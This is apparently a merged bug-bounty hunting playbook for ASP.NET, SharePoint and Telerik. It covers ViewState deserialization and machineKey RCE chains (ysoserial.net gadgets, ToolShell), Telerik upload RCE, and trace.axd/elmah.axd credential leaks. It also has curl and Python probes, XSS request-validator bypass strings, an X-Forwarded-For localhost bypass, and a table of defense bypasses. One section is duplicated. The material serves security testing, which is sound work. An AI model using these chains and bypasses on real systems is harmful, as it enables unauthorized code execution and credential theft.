- **EoL context strengthens severity:** SP2013 (final CU `15.0.5545.1000`, EoL 2023-04-11) and SP2016/2019 (EoL 2026-07-14) have no patch coming for post-EoL CVEs; note this explicitly in impact. By contrast, a current .NET 8/9 app has no ViewState at all — re-fingerprint before applying any of the above.
- **Redact before shipping:** mask the validation/decryption key bytes and any session cookies/tokens in PoCs; keep only enough prefix to prove the key is one of the published defaults (per `evidence-hygiene`).

**Quick triage matrix (copy into notes):**
```
key state                         | __VIEWSTATEENCRYPTED | accepted payload | severity
----------------------------------+----------------------+------------------+---------
unknown, signed-only              | ""                   | n/a              | Low-Med
known/public, signed-only         | ""                   | yes              | Critical
known/public, encrypted (both)    | non-empty            | yes              | Critical
shared vendor key, fleet-wide     | either               | yes on 2nd host  | Critical
CVE-2025-3600 type=iec/prtype     | n/a                  | app-pool recycle | Medium (DoS)
```

### Escalation and related chains

### Related Skills & Chains

- **`rce`** — ViewState deserialization is the headline ASP.NET RCE path; signed-only ViewState + leaked machineKey = RCE every time. Chain primitive: ASP.NET ViewState dual-parser MAC-bypass anti-pattern detected (signed but not encrypted, `<%@ Page enableViewStateMac="true" viewStateEncryptionMode="Never" %>`) + machineKey recovered (from web.config disclosure, `elmah.axd`, source leak, or GitHub) → `rce` ysoserial.net `TypeConfuseDelegate` gadget → arbitrary command in `w3wp.exe` worker-process identity.
- **`sharepoint`** — SharePoint farms inherit every ASP.NET anti-pattern plus their own surface. Chain primitive: ASP.NET fingerprint reveals SharePoint (X-SharePoint headers + `/_layouts/` reachable) → pivot to `sharepoint` for SP-specific RCE paths (ToolShell, SafeControl reflection) before generic ViewState attack.
- **`ntlm-info`** — IIS sites that advertise NTLM/Negotiate anonymously leak AD topology. Chain primitive: ASP.NET app behind IIS with `WWW-Authenticate: NTLM` → `ntlm-info` Type-2 challenge capture → internal forest name → cross-reference Entra tenant via `m365-entra-attack` discovery.
- **`file-upload`** — Telerik RadAsyncUpload, Kentico, Umbraco, and DotNetNuke all have historical upload-handler RCE. Chain primitive: ASP.NET CMS fingerprinted → `file-upload` bypass matrix against the CMS upload handler → `.aspx` written into web-accessible path → request → RCE under app-pool identity.
- **`triage-validation`** — `trace.axd`/`elmah.axd` disclosure is only Critical when it actually leaks live credentials/tokens; pure stack traces are usually Low. Chain primitive: pull every reported finding through `triage-validation` 7-Question Gate before submission — distinguish "verbose error" (informational) from "live bearer token in error log" (Critical) before writing the report (`redteam-report-template`).

---

### Related Skills & Chains

- **`hunt-rce`** — ViewState deserialization is the headline ASP.NET RCE path; signed-only ViewState + leaked machineKey = RCE every time. Chain primitive: ASP.NET ViewState dual-parser MAC-bypass anti-pattern detected (signed but not encrypted, `<%@ Page enableViewStateMac="true" viewStateEncryptionMode="Never" %>`) + machineKey recovered (from web.config disclosure, `elmah.axd`, source leak, or GitHub) → `hunt-rce` ysoserial.net `TypeConfuseDelegate` gadget → arbitrary command in `w3wp.exe` worker-process identity.
- **`hunt-sharepoint`** — SharePoint farms inherit every ASP.NET anti-pattern plus their own surface. Chain primitive: ASP.NET fingerprint reveals SharePoint (X-SharePoint headers + `/_layouts/` reachable) → pivot to `hunt-sharepoint` for SP-specific RCE paths (ToolShell, SafeControl reflection) before generic ViewState attack.
- **`hunt-ntlm-info`** — IIS sites that advertise NTLM/Negotiate anonymously leak AD topology. Chain primitive: ASP.NET app behind IIS with `WWW-Authenticate: NTLM` → `hunt-ntlm-info` Type-2 challenge capture → internal forest name → cross-reference Entra tenant via `m365-entra-attack` discovery.
- **`hunt-file-upload`** — Telerik RadAsyncUpload, Kentico, Umbraco, and DotNetNuke all have historical upload-handler RCE. Chain primitive: ASP.NET CMS fingerprinted → `hunt-file-upload` bypass matrix against the CMS upload handler → `.aspx` written into web-accessible path → request → RCE under app-pool identity.
- **`triage-validation`** — `trace.axd`/`elmah.axd` disclosure is only Critical when it actually leaks live credentials/tokens; pure stack traces are usually Low. Chain primitive: pull every reported finding through `triage-validation` 7-Question Gate before submission — distinguish "verbose error" (informational) from "live bearer token in error log" (Critical) before writing the report (`redteam-report-template`).

### Tools and wordlists

### Scenario A — Signed-only ViewState + permissive ToolPane on EoL SharePoint 2013

`https://target-portal.example/_layouts/15/ToolPane.aspx?DisplayMode=Edit` returns 200 anonymously. The form contains `__VIEWSTATE` (signed only — `__VIEWSTATEENCRYPTED=""`), and `__REQUESTDIGEST` is anonymously issued via `_api/contextinfo`. Combined with SP2013 being end-of-life (no patch will ever ship), this is the canonical CVE-2025-53770 "ToolShell" precondition chain on a permanently-unpatched code path. Reported severity: **Critical**. The dual-parser test (Section 4 of Methodology) confirmed that XML-shaped payloads reach the legacy `ObjectStateFormatter` BEFORE MAC validation — additional evidence that the chain is reachable even without full machineKey recovery (though full RCE requires both).

### Sources and related reading

### D. Sources — numbered list of URLs you actually fetched

1. https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/
2. https://cloud.google.com/blog/topics/threat-intelligence/knowledgedeliver-viewstate-deserialization-vulnerability
3. https://www.telerik.com/products/aspnet-ajax/documentation/knowledge-base/kb-security-unsafe-reflection-cve-2025-3600

### Additional notes

### Scenario B — Telerik RadAsyncUploadHandler exposed on legacy bank portal

`/Telerik.Web.UI.WebResource.axd?type=rau` returns the Telerik upload handler. Telerik version (visible in JS bundle metadata) is 2016.3.1027. CVE-2017-11317 applies — keys are baked into the public Telerik DLL of that version. Upload → write `aspx` to `/app_data/` → request → RCE. Reported severity: **Critical**.

### Scenario C — trace.axd + elmah.axd both exposed on enterprise HR portal

`trace.axd` 200 returns 50 most recent requests, including `Authorization: Bearer eyJ...` headers on API requests. `elmah.axd` 200 returns full error log with database connection-string in one of the exceptions. Reported severity: **Critical** (credentials in plaintext to anonymous internet).

---

## Companion methodology (complete, deduplicated)

Full text of every non-SKILL.md methodology document from the contributing skills.

### Companion: hunting / references/payloads.md

# aspnet — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payload & Detection Patterns



**Stack-trace fingerprint (trigger via stale ViewState POST):**

```bash

curl -sk -X POST "https://target.example/page.aspx" \

  --data "__VIEWSTATE=AAAA&__VIEWSTATEGENERATOR=AAAA"

# Inspect body for:

#  - "Validation of viewstate MAC failed" → confirms signed ViewState

#  - "The state information is invalid for this page" → confirms ALTERNATE parser path

#  - "Version Information: Microsoft .NET Framework Version:X.X.XXXXX" → exact patch level

#  - "Microsoft.SharePoint.Client.ServerStub..." → SharePoint farm

```



**ViewState parser-error differential probe (Python):**

```python

import requests, re, json

S = requests.Session(); S.verify = False

# Get fresh form

r = S.get("https://target.example/path/page.aspx")

real_vs = re.search(r'__VIEWSTATE" id="__VIEWSTATE" value="([^"]+)', r.text).group(1)

real_vsg = re.search(r'__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="([^"]+)', r.text).group(1)



# Test 7 payload shapes

for label, vs in [

    ("trivial",      "AAAA"),

    ("real",         real_vs),

    ("flipped-bit",  real_vs[:50] + "X" + real_vs[51:]),

    ("oversize",     "A" * 100000),

    ("base64",       "VGVzdE1hcmtlcjY3OFhZWg=="),

    ("xml-shaped",   "<xss/>"),

    ("losformatter", "/wEPDwUKMTcxNzgyOTQwMmRkkz9p4lzA" + "A"*50),

]:

    r = S.post("https://target.example/path/page.aspx",

               data={"__VIEWSTATE": vs, "__VIEWSTATEGENERATOR": real_vsg})

    title = re.search(r'<title>([^<]+)</title>', r.text)

    title = title.group(1)[:100] if title else "—"

    print(f"  [{label:14s}] {r.status_code}  {title}")

```



**`trace.axd` anonymous check:**

```bash

curl -sk -o /dev/null -w "%{http_code}\n" "https://target.example/trace.axd"

# 200 = full trace dump exposed → Critical

# 403 = mod set to localhost-only → check via X-Forwarded-For: 127.0.0.1

```



**WCF service enumeration:**

```bash

# Find all .svc files

curl -sk "https://target.example/" -o body.html

grep -oE '/[a-zA-Z0-9/_-]+\.svc' body.html | sort -u

# For each found:

curl -sk "https://target.example/Service.svc?wsdl" | xmllint --format - | head -60

```



**Request-validator bypass categories:**

```

# Default: <script>alert(1)</script> in ?q= → "Potentially dangerous Request.QueryString value detected"

# Bypasses that sometimes work:

?q=%3cscript%3e            (URL-encoded — depends on validator config)

?q=<svg/onload=alert(1)>  (depends on validator version)

?q=<%00script>             (NUL-byte; older validators)

?q=javascript:alert(1)     (no < at all — passes validator)

Cookie: foo=<script>       (cookie body not validated by default)

Referer: http://x.com/<script>  (referer not validated in classic ASP.NET)

```



**Telerik exploit gate (CVE-2019-18935 — requires encryption keys):**

```bash

# Fingerprint Telerik

curl -sk "https://target.example/Telerik.Web.UI.WebResource.axd?type=rau" -X POST

# If response is RadAsyncUploadHandler-style → Telerik present; try keys

# Public exploits require leaked machineKey AND telerikEncryptionKey

```



---

### Companion: hunting / references/techniques.md

# aspnet — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Bypass Techniques



| Defense | Bypass |

|---|---|

| `__VIEWSTATEENCRYPTED` non-empty (encrypted) | Recover both decryption + validation keys from any source-code leak / config-disclosure / VS forge primitive; without keys, deserialization cannot be triggered |

| Request validator blocks `<` in querystring | Move payload to Cookie / Referer / JSON body / multipart filename — validator doesn't reach those contexts in classic ASP.NET |

| `EnableViewStateMac="true"` enforced | Recover `validationKey` from web.config disclosure or `<machineKey>` AutoGenerate fingerprinting (ysoserial.net `--minify --islegacy` mode generates ViewState that passes some MAC-validation gaps) |

| `trace.axd` localhost-only | Set `X-Forwarded-For: 127.0.0.1` if the trace mode is `localOnly` and the validation uses Request.UserHostAddress (some apps use Forwarded-For instead) |

| WCF `.svc` 401 on anonymous | Try `?wsdl` and `?mex` first; metadata is sometimes anonymously enumerable even when service ops require auth |

| Telerik upload patched | Check the Telerik version: anything pre-2017Q1 (build 2017.1.118 or earlier) is the original RAU RCE. Check 2017Q3 - 2019Q3 for CVE-2019-18935 |

| `SafeControl` whitelist enforced | Inheritance gate (`instanceof PickerDialog`) IS the gate on patched SP — bypass requires finding a SafeControl subclass with a deserialization sink; enumerate via Picker.aspx |

| `customErrors mode="On"` (no stack traces) | Force a different error path: invalid Content-Length, malformed ViewState that triggers a parser-level exception below the customErrors handler |



---

## Source skills merged into this topic

- `hunting` — `aspnet`
- `cbh` — `hunt-aspnet`

## Provenance

- `references/unified-method.md` — same deduplicated union as this file, for tooling
- `references/upstream-*.md` — unmodified original SKILL.md from each repo
- `references/upstream-assets/` — 2 companion files
- `../../upstream/` — complete unmodified archives of all five source repositories
- `bbhunt-methodology` — orchestrator, state machine and class router
